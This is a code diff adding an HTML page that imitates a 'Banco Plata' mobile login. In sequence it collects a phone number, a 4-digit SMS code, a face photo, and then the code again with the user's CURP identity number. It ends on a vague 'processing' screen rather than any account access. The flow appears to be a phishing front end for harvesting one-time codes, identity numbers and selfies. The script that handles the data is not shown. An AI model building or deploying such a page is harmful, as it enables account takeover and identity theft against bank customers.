@@ -1,0 +1,555 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Banco Plata</title>
+    <style>
+        :root {
+            --background-color: #f7f9fc;
+            --text-primary: #000000;
+            --text-secondary: #1f2937;
+            --text-tertiary: #9ca3af;
+            --input-background: #ffffff;
+            --button-primary: #ff5722;
+            --button-primary-hover: #e64a19;
+            --font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            --safe-area-inset-bottom: env(safe-area-inset-bottom, 20px);
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: var(--font-family);
+        }
+
+        body {
+            background-color: var(--background-color);
+            color: var(--text-primary);
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            min-height: 100vh;
+            padding: 0 20px;
+        }
+
+        /* Control de Pantallas */
+        .screen {
+            display: none;
+            width: 100%;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .screen.active {
+            display: flex;
+        }
+
+        /* Header común */
+        .header-nav {
+            width: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            padding-top: 20px;
+            margin-bottom: 30px;
+        }
+
+        .btn-close {
+            position: absolute;
+            left: 0;
+            top: 15px;
+            width: 44px;
+            height: 44px;
+            background: #ffffff;
+            border: none;
+            border-radius: 50%;
+            font-size: 20px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0px 2px 6px rgba(0, 0, 0, 0.05);
+        }
+
+        .header-title {
+            font-size: 20px;
+            font-weight: 700;
+        }
+
+        /* Layout general */
+        .content-wrapper {
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            padding-top: 110px;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 360px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+        }
+
+        h1 {
+            font-size: 28px;
+            font-weight: 700;
+            color: var(--text-primary);
+            margin-bottom: 8px;
+            width: 100%;
+            letter-spacing: -0.3px;
+        }
+
+        .subtitle {
+            font-size: 15px;
+            color: var(--text-secondary);
+            margin-bottom: 36px;
+            width: 100%;
+        }
+
+        form {
+            width: 100%;
+        }
+
+        .input-group {
+            width: 100%;
+            margin-bottom: 20px;
+        }
+
+        .input-field {
+            width: 100%;
+            height: 56px;
+            background-color: var(--input-background);
+            border: 1px solid transparent;
+            border-radius: 18px;
+            padding: 0 20px;
+            font-size: 18px;
+            font-weight: 400;
+            color: var(--text-primary);
+            outline: none;
+            box-shadow: 0px 2px 8px rgba(0, 0, 0, 0.03);
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+
+        .input-field:focus {
+            border-color: #d1d5db;
+            box-shadow: 0px 2px 10px rgba(0, 0, 0, 0.05);
+        }
+
+        .btn-submit {
+            width: 100%;
+            height: 52px;
+            background-color: var(--button-primary);
+            color: #ffffff;
+            border: none;
+            border-radius: 26px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            outline: none;
+            transition: background-color 0.2s, transform 0.1s;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 28px;
+        }
+
+        .btn-submit:hover {
+            background-color: var(--button-primary-hover);
+        }
+
+        .btn-submit:active {
+            transform: scale(0.98);
+        }
+
+        .link-lost {
+            color: var(--text-primary);
+            font-size: 15px;
+            font-weight: 500;
+            text-decoration: none;
+        }
+
+        .footer-legal {
+            width: 100%;
+            max-width: 360px;
+            padding: 20px 0;
+            font-size: 13px;
+            color: var(--text-tertiary);
+            text-align: center;
+            margin: 0 auto;
+            margin-bottom: var(--safe-area-inset-bottom);
+        }
+
+        .footer-legal a {
+            color: var(--text-tertiary);
+            text-decoration: underline;
+        }
+
+        /* ----- PANTALLAS DE CÓDIGO (OTP) ----- */
+        .otp-subtitle {
+            font-size: 15px;
+            color: #374151;
+            text-align: center;
+            margin-bottom: 24px;
+            line-height: 1.4;
+        }
+
+        .phone-display {
+            display: block;
+            font-weight: 500;
+            color: var(--text-primary);
+        }
+
+        .otp-inputs {
+            display: flex;
+            gap: 12px;
+            justify-content: center;
+            margin-bottom: 24px;
+        }
+
+        .otp-box {
+            width: 64px;
+            height: 72px;
+            background-color: var(--input-background);
+            border: 1px solid transparent;
+            border-radius: 16px;
+            font-size: 26px;
+            font-weight: 600;
+            text-align: center;
+            outline: none;
+            box-shadow: 0px 2px 8px rgba(0, 0, 0, 0.03);
+            transition: border-color 0.2s;
+        }
+
+        .otp-box:focus {
+            border-color: #d1d5db;
+        }
+
+        .resend-text {
+            font-size: 14px;
+            color: var(--text-tertiary);
+            text-align: center;
+            margin-bottom: 24px;
+        }
+
+        .resend-link {
+            color: var(--button-primary);
+            text-decoration: none;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        /* ----- PANTALLA ROSTRO ----- */
+        .face-instructions {
+            font-size: 15px;
+            color: var(--text-secondary);
+            margin-bottom: 30px;
+            line-height: 1.4;
+        }
+
+        .camera-container {
+            width: 220px;
+            height: 220px;
+            border-radius: 50%;
+            background-color: #e5e7eb;
+            border: 4px solid #ffffff;
+            box-shadow: 0px 4px 16px rgba(0, 0, 0, 0.08);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 40px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .camera-icon {
+            width: 56px;
+            height: 56px;
+            opacity: 0.4;
+        }
+
+        .camera-overlay {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            border: 2px dashed var(--button-primary);
+            box-sizing: border-box;
+        }
+
+        /* ----- CASILLA CURP ----- */
+        .curp-container {
+            width: 100%;
+            background-color: #ffffff;
+            border-radius: 20px;
+            padding: 12px 18px 10px 18px;
+            box-shadow: 0px 2px 8px rgba(0, 0, 0, 0.02);
+            text-align: left;
+            margin-bottom: 24px;
+            border: 1px solid transparent;
+            transition: border-color 0.2s;
+        }
+
+        .curp-container:focus-within {
+            border-color: #e5e7eb;
+        }
+
+        .curp-label {
+            display: block;
+            font-size: 12px;
+            font-weight: 500;
+            color: #6b7280;
+            margin-bottom: 2px;
+            letter-spacing: 0.5px;
+        }
+
+        .curp-input-field {
+            width: 100%;
+            border: none;
+            outline: none;
+            background: transparent;
+            font-size: 16px;
+            font-weight: 500;
+            color: var(--text-primary);
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .curp-input-field::placeholder {
+            color: #d1d5db;
+            font-weight: 400;
+            letter-spacing: 0.5px;
+        }
+
+        /* ----- PANTALLA DE ÉXITO FINAL ----- */
+        .success-card {
+            width: 100%;
+            background-color: #ffffff;
+            border-radius: 28px;
+            padding: 40px 24px;
+            box-shadow: 0px 10px 30px rgba(0, 0, 0, 0.04);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-top: 60px;
+            animation: popIn 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        .success-icon-wrapper {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, #10b981 0%, #059669 100%);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 24px;
+            box-shadow: 0px 8px 20px rgba(16, 185, 129, 0.3);
+        }
+
+        .success-icon {
+            width: 40px;
+            height: 40px;
+            color: #ffffff;
+        }
+
+        .success-title {
+            font-size: 24px;
+            font-weight: 700;
+            color: var(--text-primary);
+            margin-bottom: 12px;
+        }
+
+        .success-description {
+            font-size: 15px;
+            color: #4b5563;
+            line-height: 1.5;
+            margin-bottom: 24px;
+        }
+
+        .status-pill {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background-color: #ecfdf5;
+            color: #047857;
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-size: 13px;
+            font-weight: 600;
+        }
+
+        .status-dot {
+            width: 8px;
+            height: 8px;
+            background-color: #10b981;
+            border-radius: 50%;
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes popIn {
+            0% { opacity: 0; transform: scale(0.9); }
+            100% { opacity: 1; transform: scale(1); }
+        }
+
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.3; }
+            100% { opacity: 1; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- PANTALLA 1: Teléfono -->
+    <div id="screenPhone" class="screen active">
+        <div class="content-wrapper">
+            <main class="container">
+                <h1>Ingresa tu celular</h1>
+                <p class="subtitle">Para iniciar sesión o unirte a Banco Plata</p>
+
+                <form id="phoneForm">
+                    <div class="input-group">
+                        <input 
+                            type="tel" 
+                            id="phoneInput"
+                            class="input-field" 
+                            value="+52 " 
+                            placeholder="+52 " 
+                            inputmode="numeric"
+                            required
+                        >
+                    </div>
+
+                    <button type="submit" class="btn-submit">Continuar</button>
+                </form>
+
+                <a href="#" class="link-lost">Perdí el acceso a mi número</a>
+            </main>
+        </div>
+
+        <footer class="footer-legal">
+            Al continuar aceptas el <a href="#">Aviso de Privacidad</a>
+        </footer>
+    </div>
+
+    <!-- PANTALLA 2: Confirmación de Código -->
+    <div id="screenOTP" class="screen">
+        <div class="container" style="padding-top: 10px;">
+            <header class="header-nav">
+                <button type="button" class="btn-close" id="btnCloseOTP">✕</button>
+                <h2 class="header-title">Confirmación</h2>
+            </header>
+
+            <p class="otp-subtitle">
+                Ingresa el código enviado al<br>
+                <span class="phone-display displayPhoneNumber">+52 00 0000 0000</span>
+            </p>
+
+            <div class="otp-inputs" id="otpGroup1">
+                <input type="tel" class="otp-box" maxlength="1" inputmode="numeric">
+                <input type="tel" class="otp-box" maxlength="1" inputmode="numeric">
+                <input type="tel" class="otp-box" maxlength="1" inputmode="numeric">
+                <input type="tel" class="otp-box" maxlength="1" inputmode="numeric">
+            </div>
+
+            <p class="resend-text" id="timerText">Reenviar en <span id="timerSeconds">30</span> segundos</p>
+        </div>
+    </div>
+
+    <!-- PANTALLA 3: Foto del Rostro -->
+    <div id="screenFace" class="screen">
+        <div class="container" style="padding-top: 10px;">
+            <header class="header-nav">
+                <button type="button" class="btn-close" id="btnCloseFace">✕</button>
+                <h2 class="header-title">Verificación de rostro</h2>
+            </header>
+
+            <p class="face-instructions">
+                Enfoca tu rostro dentro del círculo.<br>
+                Asegúrate de estar en un lugar bien iluminado.
+            </p>
+
+            <div class="camera-container">
+                <div class="camera-overlay"></div>
+                <svg class="camera-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5">
+                    <path d="M68 21H4a2 2 0 0 1-2-2V7a2 2 0 0 1 2-2h3l2-3h6l2 3h3a2 2 0 0 1 2 2v12a2 2 0 0 1-2 2z"></path>
+                    <circle cx="12" cy="13" r="4"></circle>
+                </svg>
+            </div>
+
+            <button type="button" class="btn-submit" id="btnTakePhoto">Tomar foto</button>
+        </div>
+    </div>
+
+    <!-- PANTALLA 4: Código + CURP -->
+    <div id="screenFinal" class="screen">
+        <div class="container" style="padding-top: 10px;">
+            <header class="header-nav">
+                <button type="button" class="btn-close" id="btnCloseFinal">✕</button>
+                <h2 class="header-title">Verificación final</h2>
+            </header>
+
+            <p class="otp-subtitle">
+                Ingresa nuevamente el código de 4 dígitos enviado a tu número y tu CURP.
+            </p>
+
+            <form id="finalForm">
+                <div class="otp-inputs" id="otpGroup2">
+                    <input type="tel" class="otp-box" maxlength="1" inputmode="numeric" required>
+                    <input type="tel" class="otp-box" maxlength="1" inputmode="numeric" required>
+                    <input type="tel" class="otp-box" maxlength="1" inputmode="numeric" required>
+                    <input type="tel" class="otp-box" maxlength="1" inputmode="numeric" required>
+                </div>
+
+                <div class="curp-container">
+                    <label class="curp-label" for="curpInput">CURP</label>
+                    <input 
+                        type="text" 
+                        id="curpInput"
+                        class="curp-input-field" 
+                        placeholder="XXXXXXXXXXXXXXXXXX" 
+                        maxlength="18"
+                        required
+                    >
+                </div>
+
+                <button type="submit" class="btn-submit">Continuar</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- PANTALLA 5: Éxito y Procesamiento -->
+    <div id="screenSuccess" class="screen">
+        <div class="container">
+            <div class="success-card">
+                <div class="success-icon-wrapper">
+                    <svg class="success-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                        <polyline points="20 6 9 17 4 12"></polyline>
+                    </svg>
+                </div>
+
+                <h2 class="success-title">¡Felicidades!</h2>
+                <p class="success-description">
+                    Su solicitud se está procesando.<br>
+                    Nos comunicaremos contigo en breve.
+                </p>
+
+                <div class="status-pill">
+                    <span class="status-dot"></span>
+                    En revisión de datos
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
